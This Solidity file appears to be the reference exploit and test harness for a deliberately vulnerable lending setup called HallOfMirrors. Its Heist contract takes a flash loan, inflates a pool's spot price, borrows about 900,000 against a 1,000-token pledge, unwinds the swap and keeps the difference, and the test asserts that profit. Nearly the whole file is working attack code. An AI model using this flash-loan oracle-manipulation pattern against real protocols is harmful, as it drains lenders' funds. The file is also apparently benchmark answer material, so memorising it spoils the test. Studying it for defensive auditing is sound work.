// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference exploit for HallOfMirrors. Flash-loan price-feed manipulation: shove the spot
// price up, borrow against a tiny honest pledge at the inflated value, unwind the swap, repay
// the flash loan, keep the drawn cash.
//
// Run by hand:
//   forge test --root proofground --match-contract ProveHallOfMirrors -vvv \
//     --allow-paths "$(pwd)/casework"

import {ExploitProof} from "@proof/ExploitProof.sol";
import {Coin, MirrorPool, QuickLoan, PawnShop} from "@contracts/HallOfMirrors.sol";

contract Heist {
    Coin public stake;
    Coin public cash;
    MirrorPool public pool;
    QuickLoan public loan;
    PawnShop public shop;

    uint256 constant FLASH = 490_000 ether;
    uint256 constant HONEST_PLEDGE = 1_000 ether;
    uint256 constant DRAW = 900_000 ether;

    constructor(Coin _stake, Coin _cash, MirrorPool _pool, QuickLoan _loan, PawnShop _shop) {
        stake = _stake;
        cash = _cash;
        pool = _pool;
        loan = _loan;
        shop = _shop;
        stake.approve(address(shop), type(uint256).max);
        stake.approve(address(pool), type(uint256).max);
        cash.approve(address(pool), type(uint256).max);
    }

    function run() external {
        shop.pledge(HONEST_PLEDGE);      // the attacker's only real capital
        loan.borrow(FLASH, "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        uint256 got = pool.swapCashForStake(amount); // push the spot price up
        shop.draw(DRAW);                             // borrow against the inflated value
        pool.swapStakeForCash(got);                  // unwind -> recover the flash principal
        cash.transfer(address(loan), amount);        // repay the flash loan
    }
}

contract ProveHallOfMirrors is ExploitProof {
    function test_exploit() external {
        Coin stake = new Coin("STAKE");
        Coin cash = new Coin("CASH");
        MirrorPool pool = new MirrorPool(stake, cash);
        QuickLoan loan = new QuickLoan(cash);
        PawnShop shop = new PawnShop(stake, cash, pool);

        // Seed the pool at price 1.0 (10k / 10k).
        stake.mint(address(this), 10_000 ether);
        cash.mint(address(this), 10_000 ether);
        stake.approve(address(pool), type(uint256).max);
        cash.approve(address(pool), type(uint256).max);
        pool.seed(10_000 ether, 10_000 ether);

        cash.mint(address(shop), 1_000_000 ether);   // the shop's lending liquidity
        cash.mint(address(loan), 500_000 ether);     // the flash-loan liquidity

        Heist heist = new Heist(stake, cash, pool, loan, shop);
        stake.mint(address(heist), 1_000 ether);     // ~1,000 CASH of honest value
        noteAttackerStart(address(heist));

        heist.run();

        // Put in ~1,000 stake, walk away with ~900,000 cash.
        profit = cash.balanceOf(address(heist));
        assertExploitLanded(100_000 ether);
        assertEq(cash.balanceOf(address(loan)), 500_000 ether, "flash loan not made whole");
    }
}
